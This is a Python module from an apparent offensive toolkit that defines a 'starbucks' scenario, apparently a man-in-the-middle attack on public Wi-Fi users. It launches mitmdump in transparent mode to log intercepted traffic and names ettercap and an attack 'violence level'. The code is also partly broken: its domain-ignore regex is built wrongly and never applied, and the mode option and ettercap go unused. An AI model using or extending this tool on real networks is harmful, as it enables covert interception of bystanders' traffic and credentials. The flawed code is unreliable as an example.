import sys
import os
import shlex
import subprocess
from typing import List
from pwntk.base_scenario import BaseScenario
from pwntk.utils.environment import is_dev
from pwntk.utils.file import timestamp_file

from pprint import pprint

__all__ = ["StarbucksScenario"]

processes = []

class StarbucksScenario(BaseScenario):
    name = "starbucks"
    programs = ["/usr/bin/mitmdump", "/usr/bin/ettercap"]
    mode: int = 2
    path: str = None
    ignored_domains = ["facebook", "google", "gmail", "apple"]

    def build_ignored_regex(self) -> str:
        d = "\.com|".join(self.ignored_domains)
        return f"^(.+\.)?({d}):443$"

    def run(self):
        ignored_domains_regex = self.build_ignored_regex()
        pprint(ignored_domains_regex)
        path_to_file = os.path.join(self.path, timestamp_file("mitmdump.log"))
        cmd = f"{self.programs[0]} --quiet --transparent -w {path_to_file}"
        print(f"Executing: {cmd}")
        mitmdump = subprocess.Popen(shlex.split(cmd))
        processes.append(mitmdump)

    def validate_options(self, parser):
        parser.add_argument("-m", "--mode", action="store", default=2,
                help="Violence level of attack (1,2,3). The default is 2")
        parser.add_argument("-p", "--path", action="store", required=True,
                help="Path of output")

        args, _ = parser.parse_known_args()
        self.mode = args.mode
        self.path = args.path

def clean_up():
    print("Cleaning up")
    for p in processes:
        p.kill()

if is_dev():
    import atexit
    atexit.register(clean_up)

